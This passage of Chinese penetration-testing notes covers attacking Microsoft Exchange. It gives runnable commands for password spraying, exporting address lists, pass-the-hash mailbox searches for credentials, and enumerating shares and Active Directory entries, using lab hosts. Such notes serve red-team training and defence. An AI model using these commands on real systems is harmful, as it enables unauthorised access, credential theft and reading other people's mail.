    # EBurst 最推荐
    # EBurst 支持所有接口爆破，-C 检查目标开放的接口，再指定存活接口爆破。建议 /ews 或默认
    python2 EBurst.py -d 192.168.123.123 -L username.txt -p 123456 -T 10
    python2 EBurst.py -d 192.168.123.123 -C
    # MailSniper.ps1 仅支持 /OWA /EWS /Microsoft-Server-ActiveSync 接口，推荐 /ews
    Invoke-PasswordSprayEWS -ExchHostname 192.168.123.123 -UserList .\username.txt -Password ZS@123qwe -Threads 10 -OutFile owa-sprayed-creds.txt
    Invoke-PasswordSprayOWA -ExchHostname 192.168.123.123 -UserList .\username.txt -Password ZS@123qwe -Threads 10 -OutFile owa-sprayed-creds.txt
    Invoke-PasswordSprayEAS -ExchHostname 192.168.123.123 -UserList .\username.txt -Password ZS@123qwe -Threads 10 -OutFile owa-sprayed-creds.txt
    ```
---
## Post Exchange
### ecp 管理
exchange server 默认将其管理页面入口 Exchange Admin Center（ecp）和其正常邮箱登录口 Outlook Web Access（owa）一同发布。默认登录地址为 https://domain/ecp/
**权限**
域管 administrator 默认为邮箱管理员,但邮箱管理员和域管其实并无关系。添加邮箱管理员不会修改用户域内权限。
**搜索**
合规性管理 ——> 就地电子数据展示和保留 ——> 添加规则
**委托**
设置权限将邮箱委托给指定用户管理使用。
ecp ——> 收件人 ——> 目标用户 ——> 邮件委托 ——> 完全访问添加指定用户
### 邮箱列表导出
**GlobalAddressList**
Exchange 存在一个全局地址列表（GAL），所有邮箱地址都位列其中。获得任一邮箱用户凭证后，可以多种方式获取 GAL，即能用于后续钓鱼，也能用于扩大爆破范围。
#### /OWA 直接导出
```
登录后,选择联系人->All Users。
https://x.x.x.x/owa/#path=/people
使用该目录获取通讯录列表, 可以通过 burp 修改返回邮件地址数量导出。一般不推荐
```
#### Offline Address Book (OAB)
/OAB 本身就是地址集合列表的副本。首先需要构造包访问 /Autodiscover 获取具体的 /OAB/xxx/oab.xml，然后下载其中的 .lzx 文件，最后通过 oabextract 解析后得到其中的 SMTP 地址信息。
/Autodiscover 除了会返回 oab.xml 地址外，还会返回域控地址。
访问 ：`https:///autodiscover/autodiscover.xml`
```
POST /autodiscover/autodiscover.xml HTTP/1.1
Host: test.f8x.com
User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.10730; Pro)
Authorization: Basic Q09OVE9TT1x1c2VyMDE6UEBzc3cwcmQ=
Content-Length: 341
Content-Type: text/xml
    PI:EMAIL
    http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a
```
请求 `/oab.xml` 页面并列出 OAB 文件：
找到其中 Default Global Address List (默认全局地址列表) 对应的 lzx 文件名称，lzx 文件名称为 fd1e35ac-08ef-4e4c-a6fc-b8b88c69c7b2-data-1.lzx
下载 lzx 文件
```
win-4j4l8gp7bf2.f8x.com/OAB/b6eaa1c0-d7f5-4619-ad8d-b453f967353b/fd1e35ac-08ef-4e4c-a6fc-b8b88c69c7b2-data-1.lzx
```
对 lzx 文件解码，还原出 Default Global Address List
```
wget http://x2100.icecube.wisc.edu/downloads/python/python2.6.Linux-x86_64.gcc-4.4.4/bin/oabextract
chmod +x oabextract
./oabextract fd1e35ac-08ef-4e4c-a6fc-b8b88c69c7b2-data-1.lzx gal.oab
strings gal.oab|grep SMTP
```
#### ldap
```
ldapsearch -x -H ldap://$IP:389 -D "CN=$username,CN=Users,DC=f8x,DC=com" -w $password -b "DC=f8x,DC=com" |grep mail:
```
Windows 系统通过 PowerView 获取所有用户邮件地址
```
$uname=$username
$pwd=ConvertTo-SecureString $password -AsPlainText -Force
$cred=New-Object System.Management.Automation.PSCredential($uname,$pwd)
Get-NetUser -Domain f8x.com -DomainController $IP -ADSpath "LDAP://DC=f8x,DC=com" -Credential $cred | fl mail
```
#### 域内查询
域内查询可以使用传统的内网渗透方式导出域用户。也可以使用域管直接远程操作 Exchange 导出邮箱地址。
```
$User = "f8x\administrator"
$Pass = ConvertTo-SecureString -AsPlainText DomainAdmin123! -Force
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://Exchange01.f8x.com/PowerShell/ -Authentication Kerberos -Credential $Credential
Import-PSSession $Session -AllowClobber
Get-Mailbox|fl PrimarySmtpAddress
Remove-PSSession $Session
```
#### /mapi
[sensepost/ruler](https://github.com/sensepost/ruler) - ruler 主要通过 /mapi 模拟 Outlook 通信，通过 /Autodiscover 实现与 Outlook 类似的自动配置能力，ruler 会自动发现 Exchange 域内的域名并访问。但如果攻击者处于域外的话，会因为 DNS 无法解析导致攻击失败，需要攻击者手动配置域名解析。
```
ruler --insecure --url https://MAIL/autodiscover/autodiscover.xml --email PI:EMAIL -u test -p 密码 --verbose --debug abk dump -o list.txt
```
```
ruler-win64.exe --insecure --url https://192.168.123.123/autodiscover/autodiscover.xml --email PI:EMAIL -u zhangsan -p ZS@123qwe --verbose --debug abk list
ruler-win64.exe --insecure --url https://192.168.123.123/autodiscover/autodiscover.xml --email PI:EMAIL -u zhangsan --hash 82b6413f42426e0b40e6d0674eb16299 --verbose --debug abk list
```
#### /EWS
[dafthack/MailSniper](https://github.com/dafthack/MailSniper) - 通过 /EWS 指定搜索条件获取 GAL，类似于爆破，很慢。
```
Get-GlobalAddressList -ExchHostname MAIL -UserName CORP\test -Password 密码 -OutFile global-address-list.txt
```
```
# MailSniper.ps1
Get-GlobalAddressList -ExchHostname 192.168.123.123 -username island.com\lisi -password LS@123qwe -OutFile global-address-list.txt
```
#### /rpc
[impacket](https://github.com/SecureAuthCorp/impacket) - 通过 /RPC 接口配合 [MS-OXNSPI] 和 [MS-NSPI] 协议直接获取 AD 中的地址簿信息，最快。
```
python3 exchanger.py DOMAIN/test:密码@MAIL nspi list-tables
python3 exchanger.py DOMAIN/test:密码@MAIL nspi dump-tables -guid xxxx
```
```
python3 exchanger.py island.com/PI:EMAIL -hashes :82b6413f42426e0b40e6d0674eb16299 nspi list-tables
python3 exchanger.py island.com/zhangsan:ZS@PI:EMAIL nspi list-tables -count
python3 exchanger.py island.com/zhangsan:ZS@PI:EMAIL nspi dump-tables -guid dd5c6c6e-f050-4fef-b91f-4ac4cb16d5cb
```
---
### 邮件导出
如果爆出了密码，直接 web 端访问 /OWA 登录查看。
如果获得了 hash，可以 pth 后 Invoke-SelfSearch 访问 /ews 查看：
```bash
# MailSniper.ps1
# 指定 lisi 的账密查询 lisi 的所有邮件
Invoke-SelfSearch -Folder all -Mailbox PI:EMAIL -ExchHostname win2012-ex2016.island.com -MailsPerUser 500 -Terms "*password*","*creds*","*credentials*","*测试*","*密码*","*拓扑*","*运维*","*VPN*","*账号*" -OutputCsv lisi-email-search.csv -Remote -User island.com\lisi -Password LS@123qwe
# 用当前会话的默认凭证搜索 zhangsan 的所有邮件
# 配合 mimikatz 实现 pth 后搜索
Invoke-SelfSearch -Folder all -Mailbox PI:EMAIL -ExchHostname win2012-ex2016.island.com -MailsPerUser 500 -Terms "*password*","*creds*","*credentials*","*测试*","*密码*","*拓扑*","*运维*","*VPN*","*账号*" -OutputCsv zhangsan-email-search.csv
```
**相关工具**
- [b0bac/GetMail](https://github.com/b0bac/GetMail) - 利用NTLM Hash读取Exchange邮件
---
### 搜索共享文件
老版本 Exchange 支持查看域内文件共享，且支持移动端通过 `/Microsoft-Server-ActiveSync` 远程访问网络内部的共享文件。在 Exchange 2010 及其后续版本中，删除了 Outlook 的文件共享权限，但通过 `/Microsoft-Server-ActiveSync` 接口依然可以。
```bash
# UNC 路径仅支持主机名，不支持 IP 和 FQDN
python2 -m peas 192.168.123.123
python2 -m peas 192.168.123.123 -u island.com\zhangsan -p ZS@123qwe --check
python2 -m peas 192.168.123.123 -u island.com\zhangsan -p ZS@123qwe --list-unc="\\WIN2012-DC1"
```
在实战中，如果已经拿下域机器了，这个手法的使用意义不大。但是如果在域外，或者是直接攻击互联网上的 Exchange，这种手法不失为一种收集共享文件的方法，配合下面的方法收集域内所有主机名再查询共享文件效果更佳。
---
### 搜索域信息
/rpc 接口支持各种远程调用，其中包括 `[MS-OXNSPI]` 协议，该协议用于客户端从 Exchange 服务器获取 OAB 数据。Exchange 本身并不存储地址簿数据，而是通过 `[MS-NSPI]` 协议与域控通信，访问 Active Directory 来获取地址簿数据。
`[MS-OXNSPI]` 和 `[MS-NSPI]` 协议都是用于获取地址簿数据的，区别是前者用于客户端与 Exchange 通信，后者用于 Exchange 与域控通信。因此，`[MS-NSPI]` 也是继 LDAP 和 `[MS-DRSR]`（也称为 DcSync 和 DRSUAPI）之后第三个访问 Active Directory 的网络协议。
遗憾的是，`[MS-OXNSPI]` 和 `[MS-NSPI]` 并不能获取全部的 Active Directory 属性，而是 X.500 空间集的属性。而且，根据微软文档描述，这两个协议仅用于获取 AD（Active Directory） 中的地址簿数据，而不能访问整个 AD 条目。不过研究人员发现，可以通过爆破 DNT（Distinguished Name Tags）的方式遍历全部 AD 条目，但是依然无法获取额外的 AD 属性。
```bash
# 需要修改 exchanger.py，否则保存的时候可能会报解码错误。
class Exchanger:
    ......
    ......
    def set_output_file(self, filename):
        self.__outputFileName = filename
        # self.__outputFd = open(self.__outputFileName, 'w+')
        self.__outputFd = open(self.__outputFileName, 'w+', encoding="utf-8") # 添加 encoding="utf-8"
# impacket
python3 exchanger.py island.com/zhangsan:ZS@PI:EMAIL nspi dnt-lookup -start-dnt 0 -stop-dnt 100000 -lookup-type FULL -output-file dnt.txt
```
在实战中，如果已经在域内了，这个手法的使用意义不大，因为 `[MS-NSPI]` 返回的 X.500 属性不像 AD 中的那么全，不能等同于 LDAP。但是如果在域外或者是直接攻击互联网上的 Exchange，可以搜索 objectSid 来发现域内机器账户，配合 /Microsoft-Server-ActiveSync 遍历主机名查询共享文件。
---
### 管理 Exchange
#### 已有高权限域账号